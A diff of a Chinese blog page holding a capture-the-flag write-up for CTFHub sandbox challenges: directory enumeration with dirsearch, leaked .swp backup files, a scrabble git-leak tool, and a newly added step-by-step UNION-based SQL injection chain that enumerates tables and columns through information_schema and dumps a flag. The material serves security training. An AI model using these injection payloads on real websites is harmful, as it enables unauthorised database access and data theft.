@@ -13,7 +13,7 @@
 <meta name="apple-mobile-web-app-capable" content="yes">
 <meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
 
-<meta name="description" content="Github-wp"/><meta name="keywords" content="WP, Saltneko" /><link rel="alternate" href="/atom.xml" title="Saltneko"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=2.11.0" />
+<meta name="description" content="Github-wp"/><link rel="alternate" href="/atom.xml" title="Saltneko"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=2.11.0" />
 <link rel="canonical" href="http://yoursite.com/2021/01/30/Github-wp/"/>
 
 <link rel="stylesheet" type="text/css" href="/lib/fancybox/jquery.fancybox.css" />
@@ -104,24 +104,26 @@
       <div class="post-meta">
         <span class="post-time">
           2021-01-30
-        </span></div>
+        </span><span class="post-category">
+            <a href="/categories/WP/">WP</a>
+            </span>
+        </div>
     </header>
 
     <div class="post-toc" id="post-toc">
     <h2 class="post-toc-title">Contents</h2>
     <div class="post-toc-content">
-      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#常见的搜集"><span class="toc-text">#常见的搜集</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#常见的搜集"><span class="toc-text">#常见的搜集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#粗心的小李"><span class="toc-text">#粗心的小李</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL注入-1"><span class="toc-text">#SQL注入-1</span></a></li></ol>
     </div>
   </div><div class="post-content"><h3 id="常见的搜集"><a href="#常见的搜集" class="headerlink" title="#常见的搜集"></a>#常见的搜集</h3><p>1.查看泄漏目录<code>python3 dirsearch.py -u http://challenge-ff56d3fec964fb86.sandbox.ctfhub.com:10080/</code><br><img src="/images/pasted-237.png" alt="upload successful"></p>
 <a id="more"></a>
 <p>2.robots.txt<br><img src="/images/pasted-238.png" alt="upload successful"><br>flag1_is_her3_fun.txt<br><img src="/images/pasted-239.png" alt="upload successful"><br>3.index.php~<br><img src="/images/pasted-240.png" alt="upload successful"><br>4..index.php.swp<br><code>cat index.php.swp</code><br><img src="/images/pasted-241.png" alt="upload successful"><br>flag:n1book{info_1s_v3ry_imp0rtant_hack}</p>
+<h3 id="粗心的小李"><a href="#粗心的小李" class="headerlink" title="#粗心的小李"></a>#粗心的小李</h3><p>1.<code>./scrabble  http://challenge-d044af84600c5d27.sandbox.ctfhub.com:10080/</code><br><img src="/images/pasted-242.png" alt="upload successful"></p>
+<h3 id="SQL注入-1"><a href="#SQL注入-1" class="headerlink" title="#SQL注入-1"></a>#SQL注入-1</h3><p>1.<code>index.php?id=-1&#39;union select 1,2,3%23</code><br><img src="/images/pasted-246.png" alt="upload successful"><br>2.<code>index.php?id=-1&#39;union select 1,database(),3%23</code><br><img src="/images/pasted-247.png" alt="upload successful"><br>3.<code>index.php?id=-1&#39;union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;note&#39;%23</code><br><img src="/images/pasted-245.png" alt="upload successful"><br>4.<code>index.php?id=-1&#39;union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#39;note&#39; and table_name=&#39;fl4g&#39;%23</code><br><img src="/images/pasted-248.png" alt="upload successful"><br>5.<code>index.php?id=-1&#39;union select 1,fllllag,3 from note.fl4g%23</code><br><img src="/images/pasted-249.png" alt="upload successful"><br>flag:n1book{union_select_is_so_cool}</p>
 
       </div>
       
       <footer class="post-footer">
-        <div class="post-tags">
-            <a href="/tags/WP/">WP</a>
-            </div>
         
         <nav class="post-nav"><a class="next" href="/2020/02/04/SQL%E6%B3%A8%E5%85%A5/">
         <span class="next-text nav-default">SQL注入</span>
